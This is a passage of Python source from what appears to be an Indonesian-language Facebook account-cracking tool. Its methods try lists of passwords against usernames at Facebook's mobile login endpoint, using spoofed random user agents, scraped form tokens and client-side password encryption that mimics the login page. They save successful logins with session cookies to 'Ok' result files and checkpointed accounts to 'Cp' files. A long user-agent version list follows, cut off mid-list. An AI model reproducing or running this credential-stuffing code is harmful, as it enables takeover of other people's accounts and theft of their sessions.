                                tree.add(Panel(f"[bold red]{self.enc_password}", style = "bold dodger_blue3", width = 61))
                                tree.add(Panel(f"[bold red]{self.useragent}", style = "bold dodger_blue3", width = 61))
                            else:
                                tree.add(Panel(f"[bold red]{self.useragent}", style = "bold dodger_blue3", width = 61))
                            print(tree)
                            time.sleep(3.0)
                            Checkpoint.append(f'{username}|{pws}|{self.useragent}')
                            with open(f'Results/Cp-{Convert().Tanggal()}.txt', 'a+') as w:
                                w.write(f'{username}|{pws}|{self.useragent}\n')
                            w.close()
                            break
                        elif 'c_user' in r.cookies.get_dict():
                            self.cookies = ("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]))
                            print("\r                                                        ", end='\r')
                            time.sleep(1.0)
                            tree = Tree(Panel.fit("[bold green]LOGIN SUCCESS", style = "bold dodger_blue3"), style = "bold white")
                            tree.add(Columns([Panel(f"[bold green]{username}", style = "bold dodger_blue3", width = 30), Panel(f"[bold green]{pws}", style = "bold dodger_blue3", width = 30)]))
                            tree.add(Panel(f"[bold green]{self.cookies}", style = "bold dodger_blue3", width = 61))
                            if '#PWD_BROWSER:5:' in str(self.enc_password):
                                tree.add(Panel(f"[bold green]{self.enc_password}", style = "bold dodger_blue3", width = 61))
                            else:
                                tree.add(Panel(f"[bold green]{self.useragent}", style = "bold dodger_blue3", width = 61))
                            print(tree)
                            time.sleep(3.0)
                            Sukses.append(f'{username}|{pws}|{self.cookies}|{self.useragent}')
                            with open(f'Results/Ok-{Convert().Tanggal()}.txt', 'a+') as w:
                                w.write(f'{username}|{pws}|{self.cookies}|{self.useragent}\n')
                            w.close()
                            break
                        elif 'checkpoint' in r.cookies.get_dict():
                            print("\r                                                        ", end='\r')
                            time.sleep(1.0)
                            tree = Tree(Panel.fit("[bold red]LOGIN CHECKPOINT", style = "bold dodger_blue3"), style = "bold white")
                            tree.add(Columns([Panel(f"[bold red]{username}", style = "bold dodger_blue3", width = 30), Panel(f"[bold red]{pws}", style = "bold dodger_blue3", width = 30)]))
                            if '#PWD_BROWSER:5:' in str(self.enc_password):
                                tree.add(Panel(f"[bold red]{self.enc_password}", style = "bold dodger_blue3", width = 61))
                                tree.add(Panel(f"[bold red]{self.useragent}", style = "bold dodger_blue3", width = 61))
                            else:
                                tree.add(Panel(f"[bold red]{self.useragent}", style = "bold dodger_blue3", width = 61))
                            print(tree)
                            time.sleep(3.0)
                            Checkpoint.append(f'{username}|{pws}|{self.useragent}')
                            with open(f'Results/Cp-{Convert().Tanggal()}.txt', 'a+') as w:
                                w.write(f'{username}|{pws}|{self.useragent}\n')
                            w.close()
                            break
                        else:
                            continue
            Looping += 1
            print(f"[bold dodger_blue3]   ───>[bold white] Crack[bold green] {str(username)[:15]}[bold white]/[bold blue]{Looping}[bold white]/[bold blue]{str(len(total))}[bold white]/[bold blue]{str(self.persen)[:4]}%[bold white] Cp:-[bold red]{len(Checkpoint)}[bold white] Ok:-[bold green]{len(Sukses)}     ", end='\r');time.sleep(0.0007)
        except (RequestException) as e:
            print("\r                                                        ", end='\r')
            print("[bold dodger_blue3]   ───>[bold red] KONEKSI ERROR!", end='\r')
            time.sleep(10.5)
            self.Web_Regular(total, username, password, encrypt_password)
        except (Exception) as e:
            print("\r                                                        ", end='\r')
            print(f"[bold dodger_blue3]   ───>[bold red] {str(e).upper()}!", end='\r')

    def Mobile_Prod(self, total, username, password, encrypt_password):
        global Sukses, Checkpoint, Looping
        try:
            for pws in password:
                if len(pws) < 6:
                    continue
                else:
                    self.useragent, self.persen = (Generate().Android_Useragent()), (Looping * 100 / len(total))
                    with requests.Session() as r:
                        r.headers.update({
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                            'Sec-Fetch-Mode': 'navigate',
                            'Accept-Encoding': 'gzip, deflate',
                            'Sec-Fetch-Site': 'none',
                            'Host': 'm.prod.facebook.com',
                            'Sec-Fetch-Dest': 'document',
                            'Accept-Language': 'en-US,en;q=0.9',
                            'User-Agent': self.useragent,
                            'Sec-Fetch-User': '?1',
                            'Connection': 'keep-alive',
                            'Upgrade-Insecure-Requests': '1',
                        })
                        response = r.get('https://m.prod.facebook.com/login.php?').text
                        try:
                            self.response_cookies = ("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]))
                            self.ajaxURI = re.search('ajaxURI:"(.*?)"', str(response)).group(1)
                            self.m_ts = re.search('name="m_ts" value="(\d+)"', str(response)).group(1)
                            self.li = re.search('name="li" value="(.*?)"', str(response)).group(1)
                            self.fb_dtsg = re.search('{"dtsg":{"token":"(.*?)"', str(response)).group(1)
                            self.jazoest = re.search('name="jazoest" value="(\d+)"', str(response)).group(1)
                            self.lsd = re.search('name="lsd" value="(.*?)"', str(response)).group(1)
                            self.__a = re.search('"encrypted":"(.*?)"', str(response)).group(1)
                            if bool(encrypt_password) == True:
                                self.pubKeyData = re.search('{publicKey:"(.*?)",keyId:(\d+)}', str(response))
                                self.publicKey, self.keyId = self.pubKeyData.group(1), self.pubKeyData.group(2)
                                self.enc_password = self.Encrypt_Password_Browser(int(self.keyId), self.publicKey, pws)
                            else:
                                self.enc_password = (f'#PWD_BROWSER:0:{int(datetime.datetime.now().timestamp())}:{pws}')
                            data = {
                                'first_prefill_source': 'browser_dropdown',
                                'jazoest': self.jazoest,
                                '__a': self.__a,
                                'unrecognized_tries': 0,
                                '__dyn': '',
                                'bi_wvdp': '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
                                'm_ts': self.m_ts,
                                'li': self.li,
                                'first_prefill_type': 'contact_point',
                                'email': username,
                                'had_cp_prefilled': True,
                                'bi_xrwh': 0,
                                'had_password_prefilled': True,
                                'try_number': 0,
                                'prefill_source': 'browser_dropdown',
                                'prefill_contact_point': '',
                                'fb_dtsg': self.fb_dtsg,
                                '__user': 0,
                                'encpass': self.enc_password,
                                '__req': random.choice(['1', '2', '3', '4']),
                                'is_smart_lock': False,
                                'lsd': self.lsd,
                                'prefill_type': 'password',
                                '__csr': '',
                            }
                            r.headers.update({
                                'Origin': 'https://m.prod.facebook.com',
                                'Accept-Encoding': 'gzip, deflate, br',
                                'Sec-Fetch-Mode': 'cors',
                                'X-Response-Format': 'JSONStream',
                                'X-ASBD-ID': '129477',
                                'referer': 'https://m.prod.facebook.com/login.php?',
                                'Accept': '*/*',
                                'Content-Length': 'application/x-www-form-urlencoded',
                                'X-FB-LSD': self.lsd,
                                'Cookie': f'm_pixel_ratio=1.5; wd=1263x595; {self.response_cookies}',
                                'Sec-Fetch-Dest': 'empty',
                                'X-Response-Forma': 'XMLHttpRequest',
                                'dpr': '1.5',
                                'content-length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),
                                'Sec-Fetch-Site': 'same-origin',
                            })
                            response2 = r.post('https://m.prod.facebook.com{}'.format(self.ajaxURI), data = data, allow_redirects = True)
                            #open('Response.txt', 'a+').write(f'{username}|{pws}|{self.enc_password}|{self.useragent}|{r.cookies.get_dict()}\n')
                        except (AttributeError):
                            try:
                                r.headers.clear()
                                self.enc_password = ('Tidak Ada')
                                self.ajaxURI = re.search('method="post" action="(.*?)"', str(response)).group(1).replace('amp;', '')
                                self.lsd = re.search('name="lsd" value="(.*?)"', str(response)).group(1)
                                self.jazoest = re.search('name="jazoest" value="(\d+)"', str(response)).group(1)
                                self.m_ts = re.search('name="m_ts" value="(\d+)"', str(response)).group(1)
                                self.li = re.search('name="li" value="(.*?)"', str(response)).group(1)
                                data = {
                                    'try_number': 0,
                                    'login': 'Log In',
                                    'lsd': self.lsd,
                                    'pass': pws,
                                    'email': username,
                                    'm_ts': self.m_ts,
                                    'bi_xrwh': 0,
                                    'li': self.li,
                                    'unrecognized_tries': 0,
                                    'jazoest': self.jazoest,
                                }
                                r.headers.update({
                                    'Referer': 'https://m.prod.facebook.com/login.php?',
                                    'Sec-Fetch-Site': 'same-origin',
                                    'Origin': 'https://m.prod.facebook.com',
                                    'Cookie': f'm_pixel_ratio=1.5; wd=1263x595; {self.response_cookies}',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Encoding': 'gzip, deflate, br',
                                    'Cache-Control': 'max-age=0',
                                    'Content-Length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),
                                    'Content-Type': 'application/x-www-form-urlencoded',
                                })
                                response2 = r.post('https://m.prod.facebook.com{}'.format(self.ajaxURI), data = data, allow_redirects = True)
                                #open('Response.txt', 'a+').write(f'{username}|{pws}|{self.enc_password}|{self.useragent}|{r.cookies.get_dict()}\n')
                            except (AttributeError):
                                print("\r                                                        ", end='\r')
                                print("[bold dodger_blue3]   ───>[bold red] ATTRIBUTEERROR!", end='\r')
                                time.sleep(1.5)
                                continue
                        if 'c_user' in r.cookies.get_dict():
                            self.cookies = ("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]))
                            print("\r                                                        ", end='\r')
                            time.sleep(1.0)
                            tree = Tree(Panel.fit("[bold green]LOGIN SUCCESS", style = "bold dodger_blue3"), style = "bold white")
                            tree.add(Columns([Panel(f"[bold green]{username}", style = "bold dodger_blue3", width = 30), Panel(f"[bold green]{pws}", style = "bold dodger_blue3", width = 30)]))
                            tree.add(Panel(f"[bold green]{self.cookies}", style = "bold dodger_blue3", width = 61))
                            if '#PWD_BROWSER:5:' in str(self.enc_password):
                                tree.add(Panel(f"[bold green]{self.enc_password}", style = "bold dodger_blue3", width = 61))
                            else:
                                tree.add(Panel(f"[bold green]{self.useragent}", style = "bold dodger_blue3", width = 61))
                            print(tree)
                            time.sleep(3.0)
                            Sukses.append(f'{username}|{pws}|{self.cookies}|{self.useragent}')
                            with open(f'Results/Ok-{Convert().Tanggal()}.txt', 'a+') as w:
                                w.write(f'{username}|{pws}|{self.cookies}|{self.useragent}\n')
                            w.close()
                            break
                        elif 'checkpoint' in r.cookies.get_dict():
                            print("\r                                                        ", end='\r')
                            time.sleep(1.0)
                            tree = Tree(Panel.fit("[bold red]LOGIN CHECKPOINT", style = "bold dodger_blue3"), style = "bold white")
                            tree.add(Columns([Panel(f"[bold red]{username}", style = "bold dodger_blue3", width = 30), Panel(f"[bold red]{pws}", style = "bold dodger_blue3", width = 30)]))
                            if '#PWD_BROWSER:5:' in str(self.enc_password):
                                tree.add(Panel(f"[bold red]{self.enc_password}", style = "bold dodger_blue3", width = 61))
                                tree.add(Panel(f"[bold red]{self.useragent}", style = "bold dodger_blue3", width = 61))
                            else:
                                tree.add(Panel(f"[bold red]{self.useragent}", style = "bold dodger_blue3", width = 61))
                            print(tree)
                            time.sleep(3.0)
                            Checkpoint.append(f'{username}|{pws}|{self.useragent}')
                            with open(f'Results/Cp-{Convert().Tanggal()}.txt', 'a+') as w:
                                w.write(f'{username}|{pws}|{self.useragent}\n')
                            w.close()
                            break
                        else:
                            continue
            Looping += 1
            print(f"[bold dodger_blue3]   ───>[bold white] Crack[bold green] {str(username)[:15]}[bold white]/[bold blue]{Looping}[bold white]/[bold blue]{str(len(total))}[bold white]/[bold blue]{str(self.persen)[:4]}%[bold white] Cp:-[bold red]{len(Checkpoint)}[bold white] Ok:-[bold green]{len(Sukses)}     ", end='\r');time.sleep(0.0007)
        except (RequestException) as e:
            print("\r                                                        ", end='\r')
            print("[bold dodger_blue3]   ───>[bold red] KONEKSI ERROR!", end='\r')
            time.sleep(10.5)
            self.Mobile_Prod(total, username, password, encrypt_password)
        except (Exception) as e:
            print("\r                                                        ", end='\r')
            print(f"[bold dodger_blue3]   ───>[bold red] {str(e).upper()}!", end='\r')

    def Encrypt_Password_Reactnative(self, key_id, pub_key, password):
        try:
            self.rand_key = get_random_bytes(32)
            self.iv = get_random_bytes(12)
            self.encrypted_rand_key = PKCS1_v1_5.new(RSA.import_key(pub_key)).encrypt(self.rand_key)
            self.cipher_aes = AES.new(self.rand_key, AES.MODE_GCM, nonce=self.iv)
            self.current_time = int(time.time())
            self.cipher_aes.update(str(self.current_time).encode("utf-8"))

            self.encrypted_passwd, self.auth_tag = self.cipher_aes.encrypt_and_digest(password.encode("utf-8"))
            self.bytes_io = io.BytesIO()
            self.bytes_io.write(bytes([1, int(key_id)]))
            self.bytes_io.write(self.iv)
            self.bytes_io.write(struct.pack("<h", len(self.encrypted_rand_key)))

            self.bytes_io.write(self.encrypted_rand_key)
            self.bytes_io.write(self.auth_tag)
            self.bytes_io.write(self.encrypted_passwd)
            self.encoded = base64.b64encode(self.bytes_io.getvalue()).decode("utf-8")
            return ('#PWD_REACTNATIVE:2:{}:{}'.format(self.current_time, self.encoded))
        except (Exception, UnicodeDecodeError, UnicodeEncodeError) as e:
            return ('#PWD_REACTNATIVE:0:{}:{}'.format(int(time.time()), password))

    def Encrypt_Password_Browser(self, key_id, pub_key, password):
        try:
            self.key = randoms.get_random_bytes(32)
            self.iv = bytes([0] * 12)
            self.time = int(datetime.datetime.now().timestamp())

            self.aes = AES.new(self.key, AES.MODE_GCM, nonce = self.iv, mac_len = 16)
            self.aes.update(str(self.time).encode('utf-8'))
            self.encrypted_password, self.cipher_tag = self.aes.encrypt_and_digest(password.encode('utf-8'))
            self.pub_key_bytes = binascii.unhexlify(pub_key)
            self.seal_box = SealedBox(PublicKey(self.pub_key_bytes))
            self.encrypted_key = self.seal_box.encrypt(self.key)
            self.encrypted = bytes([1,
                key_id,
                *list(struct.pack('<h', len(self.encrypted_key))),
                *list(self.encrypted_key),
                *list(self.cipher_tag),
                *list(self.encrypted_password)])
            self.encrypted = base64.b64encode(self.encrypted).decode('utf-8')
            return (f'#PWD_BROWSER:5:{self.time}:{self.encrypted}')
        except (Exception, UnicodeDecodeError, UnicodeEncodeError) as e:
            return (f'#PWD_BROWSER:0:{int(datetime.datetime.now().timestamp())}:{password}')

class Generate:

    def __init__(self) -> None:
        pass

    def Facebook_Apps_Useragent(self):
        try:
            self.device = str(random.choice(Useragent['Device'].split(','))).capitalize()
            self.app_version = random.choice(['437.0.0.0.47', '436.0.0.21.101', '436.0.0.17.101', '436.0.0.10.101', '436.0.0.0.60', '436.0.0.0.44', '436.0.0.0.28', '436.0.0.0.5', '435.0.0.37.112', '435.0.0.24.112', '435.0.0.8.112', '435.0.0.2.112', '435.0.0.0.68', '434.0.0.33.115', '434.0.0.1.115', '434.0.0.0.89', '433.0.0.23.111', '433.0.0.0.99', '437.0.0.0.47', '436.0.0.21.101', '436.0.0.17.101', '436.0.0.10.101', '436.0.0.0.60', '436.0.0.0.44', '436.0.0.0.28', '436.0.0.0.5', '435.0.0.37.112', '435.0.0.24.112', '435.0.0.8.112', '435.0.0.2.112', '435.0.0.0.68', '434.0.0.33.115', '434.0.0.1.115', '434.0.0.0.89', '433.0.0.23.111', '433.0.0.0.99', '433.0.0.0.66', '432.0.0.25.102', '432.0.0.6.102', '432.0.0.1.102', '432.0.0.0.80', '432.0.0.0.74', '432.0.0.0.62', '432.0.0.0.61', '432.0.0.0.45', '432.0.0.0.30', '432.0.0.0.18', '431.0.0.24.108', '431.0.0.14.108', '431.0.0.3.108', '431.0.0.1.108', '431.0.0.0.106', '431.0.0.0.95', '431.0.0.0.32', '431.0.0.0.19', '431.0.0.0.5', '430.0.0.11.113', '430.0.0.9.113', '430.0.0.1.113', '430.0.0.0.86', '430.0.0.0.3', '429.0.0.13.114', '429.0.0.11.114', '429.0.0.6.114', '429.0.0.1.114', '429.0.0.0.93', '429.0.0.0.81', '429.0.0.0.59', '429.0.0.0.9', '428.0.0.20.108', '428.0.0.14.108', '428.0.0.12.108', '428.0.0.6.108', '428.0.0.1.108', '428.0.0.0.74', '428.0.0.0.62', '428.0.0.0.47', '428.0.0.0.30', '428.0.0.0.5', '427.0.0.20.62', '427.0.0.15.62', '427.0.0.3.62', '427.0.0.0.55', '427.0.0.0.9', '427.0.0.0.1', '426.0.0.13.50', '426.0.0.2.50', '426.0.0.0.41', '426.0.0.0.33', '426.0.0.0.19', '426.0.0.0.9', '426.0.0.0.0', '425.0.0.23.49', '425.0.0.6.49', '425.0.0.5.49', '425.0.0.0.40', '425.0.0.0.33', '425.0.0.0.27', '425.0.0.0.20', '425.0.0.0.7', '425.0.0.0.0', '424.0.0.10.75', '424.0.0.9.75', '424.0.0.5.75', '424.0.0.1.75', '424.0.0.0.67', '424.0.0.0.46', '424.0.0.0.35', '424.0.0.0.15', '423.0.0.11.64', '423.0.0.6.64', '423.0.0.2.64', '423.0.0.0.56', '423.0.0.0.44', '423.0.0.0.35', '423.0.0.0.24', '423.0.0.0.12', '422.0.0.17.76', '422.0.0.10.76', '422.0.0.2.76', '422.0.0.0.66', '422.0.0.0.15', '422.0.0.0.14', '422.0.0.0.2', '421.0.0.16.47', '421.0.0.12.47', '421.0.0.6.47', '421.0.0.4.47', '421.0.0.0.28', '420.0.0.27.61', '420.0.0.23.61', '420.0.0.1.61', '420.0.0.0.46', '420.0.0.0.44', '420.0.0.0.36', '420.0.0.0.30', '420.0.0.0.19', '420.0.0.0.3', '419.0.0.20.71', '419.0.0.14.71', '419.0.0.7.71', '419.0.0.2.71', '419.0.0.0.57', '419.0.0.0.54', '419.0.0.0.41', '419.0.0.0.28', '419.0.0.0.15', '419.0.0.0.8', '418.0.0.35.69', '418.0.0.15.69', '418.0.0.5.69', '418.0.0.2.69', '418.0.0.0.60', '418.0.0.0.54', '418.0.0.0.48', '418.0.0.0.38', '418.0.0.0.22', '418.0.0.0.16', '418.0.0.0.4', '417.0.0.19.65', '417.0.0.10.65', '417.0.0.5.65', '417.0.0.0.60', '417.0.0.0.59', '417.0.0.0.44', '417.0.0.0.4', '416.0.0.36.85', '416.0.0.26.85', '416.0.0.21.85', '416.0.0.16.85', '416.0.0.5.85', '416.0.0.0.72', '416.0.0.0.12', '415.0.0.35.107', '415.0.0.26.107', '415.0.0.20.107', '415.0.0.0.106', '415.0.0.0.61', '415.0.0.0.50', '415.0.0.0.28', '414.0.0.20.113', '414.0.0.6.113', '414.0.0.0.90', '414.0.0.0.58', '414.0.0.0.44', '414.0.0.0.5', '413.0.0.23.104', '413.0.0.10.104', '413.0.0.4.104', '413.0.0.0.70', '413.0.0.0.63', '413.0.0.0.33', '413.0.0.0.20', '412.0.0.16.115', '412.0.0.6.115', '412.0.0.2.115', '412.0.0.0.86', '412.0.0.0.25', '412.0.0.0.5', '411.0.0.22.112', '411.0.0.18.112', '411.0.0.11.112', '411.0.0.0.101', '411.0.0.0.86', '411.0.0.0.70', '411.0.0.0.54', '411.0.0.0.33', '411.0.0.0.19', '410.0.0.15.115', '410.0.0.6.115', '410.0.0.1.115', '410.0.0.0.104', '410.0.0.0.80', '410.0.0.0.72', '410.0.0.0.55', '410.0.0.0.27', '410.0.0.0.5', '409.0.0.24.106', '409.0.0.15.106', '409.0.0.8.106', '409.0.0.2.106', '409.0.0.0.94', '409.0.0.0.78', '409.0.0.0.63', '409.0.0.0.45', '409.0.0.0.29', '409.0.0.0.15', '408.0.0.30.103', '408.0.0.23.103', '408.0.0.8.103', '408.0.0.2.103', '408.0.0.0.84', '408.0.0.0.74', '408.0.0.0.59', '408.0.0.0.23', '408.0.0.0.22', '408.0.0.0.12', '407.0.0.22.97', '407.0.0.9.97', '407.0.0.5.97', '407.0.0.1.97', '407.0.0.0.82', '407.0.0.0.69', '407.0.0.0.60', '407.0.0.0.45', '407.0.0.0.30', '407.0.0.0.27', '407.0.0.0.18', '407.0.0.0.5', '407.0.0.0.2', '406.0.0.17.90', '406.0.0.13.90', '406.0.0.5.90', '406.0.0.0.77', '406.0.0.0.56', '406.0.0.0.27', '406.0.0.0.6', '406.0.0.0.2', '405.0.0.16.72', '405.0.0.11.72', '405.0.0.8.72', '405.0.0.3.72', '405.0.0.0.56', '405.0.0.0.37', '405.0.0.0.3', '404.0.0.17.70', '404.0.0.7.70', '404.0.0.1.69', '404.0.0.0.53', '404.0.0.0.29', '404.0.0.0.15', '403.0.0.0.85', '403.0.0.9.81', '403.0.0.5.81', '403.0.0.2.81', '403.0.0.0.53', '402.0.0.13.84', '402.0.0.11.84', '402.0.0.5.84', '402.0.0.0.74', '402.0.0.0.61', '402.0.0.0.53', '402.0.0.0.38', '402.0.0.0.19', '402.0.0.0.14', '401.0.0.14.77', '401.0.0.1.77', '400.0.0.16.76', '400.0.0.9.76', '400.0.0.4.76', '400.0.0.0.61', '400.0.0.0.3', '399.0.0.14.93', '399.0.0.1.93', '399.0.0.0.71', '399.0.0.0.52', '399.0.0.0.45', '399.0.0.0.22', '398.0.0.16.105', '398.0.0.11.105', '398.0.0.5.105', '398.0.0.1.105', '398.0.0.0.84', '398.0.0.0.78', '398.0.0.0.63', '398.0.0.0.48', '398.0.0.0.30', '398.0.0.0.2', '397.0.0.15.404', '397.0.0.11.404', '397.0.0.3.404', '397.0.0.1.404', '397.0.0.0.391', '397.0.0.0.365', '397.0.0.0.349', '397.0.0.0.332', '397.0.0.0.315', '397.0.0.0.302', '397.0.0.0.290', '397.0.0.0.274', '397.0.0.0.258', '397.0.0.0.208', '397.0.0.0.201', '397.0.0.0.180', '397.0.0.0.173', '397.0.0.0.144', '397.0.0.0.126', '397.0.0.0.117', '397.0.0.0.76', '397.0.0.0.75', '397.0.0.0.59', '397.0.0.0.41', '397.0.0.0.18', '396.0.0.18.104', '396.0.0.15.104', '396.0.0.7.104', '396.0.0.3.104', '396.0.0.0.86', '396.0.0.0.70', '396.0.0.0.18', '395.0.0.15.214', '395.0.0.12.214', '395.0.0.8.214', '395.0.0.0.200', '395.0.0.0.177', '395.0.0.0.77', '395.0.0.0.58', '395.0.0.0.33', '395.0.0.0.0', '394.0.0.40.107', '394.0.0.11.107', '394.0.0.7.107', '394.0.0.3.107', '394.0.0.1.107', '394.0.0.0.100', '394.0.0.0.74', '394.0.0.0.58', '394.0.0.0.24', '394.0.0.0.18', '393.0.0.25.106', '393.0.0.13.106', '393.0.0.10.106', '393.0.0.2.106', '393.0.0.0.81', '393.0.0.0.30', '392.0.0.15.108', '392.0.0.7.108', '392.0.0.2.108', '392.0.0.0.52', '392.0.0.0.26', '392.0.0.0.0', '391.0.0.17.104', '391.0.0.9.104', '391.0.0.2.104', '391.0.0.1.104', '391.0.0.0.90', '391.0.0.0.76', '391.0.0.0.39', '391.0.0.0.23', '390.0.0.13.105', '390.0.0.8.105', '390.0.0.1.105', '390.0.0.0.94', '390.0.0.0.73', '390.0.0.0.44', '389.0.0.0.103', '390.0.0.0.17', '389.0.0.29.111', '389.0.0.24.111', '389.0.0.11.111', '389.0.0.2.111', '389.0.0.0.87', '388.0.0.26.105', '388.0.0.22.105', '388.0.0.10.105', '388.0.0.0.67', '388.0.0.0.47', '387.0.0.19.102', '387.0.0.0.60', '387.0.0.0.11', '387.0.0.0.4', '386.0.0.19.108', '386.0.0.15.108', '386.0.0.5.108', '386.0.0.0.95', '386.0.0.0.65', '386.0.0.0.50', '386.0.0.0.33', '386.0.0.0.10', '385.0.0.22.114', '385.0.0.18.114', '385.0.0.7.114', '385.0.0.0.90', '385.0.0.0.54', '385.0.0.0.34', '385.0.0.0.0', '384.0.0.16.111', '384.0.0.8.111', '384.0.0.1.111', '384.0.0.0.98', '384.0.0.0.82', '384.0.0.0.66', '384.0.0.0.50', '384.0.0.0.34', '384.0.0.0.4', '383.0.0.14.106', '383.0.0.9.106', '383.0.0.2.106', '383.0.0.0.72', '383.0.0.0.61', '383.0.0.0.51', '383.0.0.0.33', '382.0.0.27.111', '382.0.0.23.111', '382.0.0.17.111', '382.0.0.13.111', '382.0.0.0.85', '382.0.0.0.42', '381.0.0.23.105', '381.0.0.17.105', '381.0.0.8.105', '381.0.0.1.105', '381.0.0.0.92', '381.0.0.0.77', '381.0.0.0.66', '381.0.0.0.49', '381.0.0.0.20', '380.0.0.18.109', '380.0.0.1.109', '380.0.0.0.97', '380.0.0.0.82', '380.0.0.0.52', '380.0.0.0.7', '380.0.0.0.2', '379.0.0.15.109', '379.0.0.2.109', '379.0.0.1.109', '379.0.0.0.68', '379.0.0.0.66', '379.0.0.0.49', '379.0.0.0.33', '379.0.0.0.18', '379.0.0.0.2', '378.0.0.14.112', '378.0.0.8.112', '378.0.0.3.112', '378.0.0.1.112', '378.0.0.0.93', '378.0.0.0.82', '378.0.0.0.51', '378.0.0.0.25', '378.0.0.0.6', '377.0.0.13.107', '377.0.0.10.107', '377.0.0.4.107', '377.0.0.3.107', '377.0.0.0.95', '377.0.0.0.78', '377.0.0.0.46', '377.0.0.0.1', '376.0.0.5.108', '376.0.0.1.108', '376.0.0.0.92', '376.0.0.0.66', '376.0.0.0.50', '376.0.0.0.41', '376.0.0.0.19', '376.0.0.0.1', '375.0.0.20.111', '375.0.0.9.111', '375.0.0.2.111', '375.0.0.0.100', '374.0.0.18.109', '374.0.0.8.109', '374.0.0.0.67', '374.0.0.0.65', '374.0.0.0.23', '373.0.0.30.112', '373.0.0.24.112', '373.0.0.17.112', '373.0.0.12.112', '373.0.0.5.112', '373.0.0.0.67', '373.0.0.0.49', '373.0.0.0.33', '373.0.0.0.17', '372.0.0.13.107', '372.0.0.11.107', '372.0.0.7.107', '372.0.0.1.107', '372.0.0.0.88', '372.0.0.0.79', '372.0.0.0.47', '372.0.0.0.16', '372.0.0.0.3', '371.0.0.10.109', '371.0.0.6.109', '371.0.0.0.50', '371.0.0.0.2', '370.0.0.1.112', '369.0.0.3.103', '369.0.0.0.80', '369.0.0.0.26', '368.0.0.0.94', '369.0.0.0.2', '368.0.0.1.108', '368.0.0.0.14', '368.0.0.0.3', '367.0.0.1.107', '367.0.0.0.65', '366.0.0.13.113', '366.0.0.0.93', '366.0.0.0.42', '366.0.0.0.0', '365.0.0.13.112', '365.0.0.1.112', '365.0.0.0.96', '365.0.0.0.11', '364.0.0.8.132', '364.0.0.0.66', '364.0.0.0.35', '364.0.0.0.19', '364.0.0.0.1', '363.0.0.23.112', '363.0.0.1.112', '363.0.0.0.93', '363.0.0.0.83', '363.0.0.0.68', '363.0.0.0.51', '363.0.0.0.34', '363.0.0.0.14', '363.0.0.0.4', '362.0.0.19.109', '362.0.0.15.109', '362.0.0.12.109', '362.0.0.4.109', '362.0.0.3.109', '362.0.0.0.51', '362.0.0.0.41', '362.0.0.0.35', '362.0.0.0.18', '361.0.0.20.115', '361.0.0.12.115', '361.0.0.7.115', '361.0.0.0.83', '361.0.0.0.82', '361.0.0.0.66', '361.0.0.0.50', '361.0.0.0.32', '361.0.0.0.4', '360.0.0.17.113', '360.0.0.10.113', '360.0.0.5.113', '360.0.0.2.113', '360.0.0.0.88', '360.0.0.0.6', '360.0.0.0.1', '359.0.0.25.118', '359.0.0.12.118', '359.0.0.2.118', '359.0.0.0.104', '359.0.0.0.29', '359.0.0.0.18', '358.0.0.27.117', '358.0.0.24.117', '358.0.0.22.117', '358.0.0.9.117', '358.0.0.5.117', '358.0.0.0.103', '358.0.0.0.87', '358.0.0.0.47', '358.0.0.0.18', '357.0.0.22.115', '357.0.0.12.115', '357.0.0.9.115', '357.0.0.4.115', '357.0.0.1.115', '357.0.0.0.100', '357.0.0.0.86', '357.0.0.0.68', '357.0.0.0.53', '357.0.0.0.10', '357.0.0.0.9', '356.0.0.26.112','356.0.0.18.112', '356.0.0.12.112', '356.0.0.5.112', '356.0.0.0.98', '356.0.0.0.65', '356.0.0.0.40', '356.0.0.0.16', '356.0.0.0.15', '356.0.0.0.2', '355.0.0.19.108', '355.0.0.11.108', '355.0.0.7.108', '355.0.0.5.108', '355.0.0.1.108', '355.0.0.0.98', '355.0.0.0.84', '355.0.0.0.61', '355.0.0.0.30', '355.0.0.0.22', '354.0.0.14.110', '354.0.0.9.110', '354.0.0.7.110', '354.0.0.3.110', '354.0.0.0.35', '354.0.0.0.20', '354.0.0.0.2', '353.0.0.21.116', '353.0.0.14.116', '353.0.0.1.116', '353.0.0.0.95', '353.0.0.0.85', '353.0.0.0.43', '353.0.0.0.32', '353.0.0.0.5', '353.0.0.0.4', '352.0.0.17.117', '352.0.0.12.117', '352.0.0.9.117', '352.0.0.4.117', '352.0.0.2.117', '352.0.0.1.117', '352.0.0.0.106', '351.0.0.22.117', '351.0.0.17.117', '351.0.0.9.117', '351.0.0.0.103', '351.0.0.0.87', '351.0.0.0.70', '351.0.0.0.52', '351.0.0.0.37', '351.0.0.0.19', '351.0.0.0.1', '350.0.0.24.106', '350.0.0.15.106', '350.0.0.13.106', '350.0.0.9.106', '350.0.0.2.106', '350.0.0.0.89', '350.0.0.0.21', '350.0.0.0.6', '350.0.0.0.1', '349.0.0.34.470', '349.0.0.16.470', '349.0.0.12.470', '349.0.0.8.470', '349.0.0.3.470', '349.0.0.0.447', '349.0.0.0.398', '349.0.0.0.395', '349.0.0.0.383', '349.0.0.0.370', '349.0.0.0.351', '349.0.0.0.318', '349.0.0.0.300', '349.0.0.0.286', '349.0.0.0.267', '349.0.0.0.245', '349.0.0.0.227', '349.0.0.0.218', '349.0.0.0.122', '349.0.0.0.119', '349.0.0.0.89', '349.0.0.0.85', '349.0.0.0.68', '349.0.0.0.54', '349.0.0.0.22', '349.0.0.0.0', '348.0.0.18.118', '348.0.0.11.118', '348.0.0.3.118', 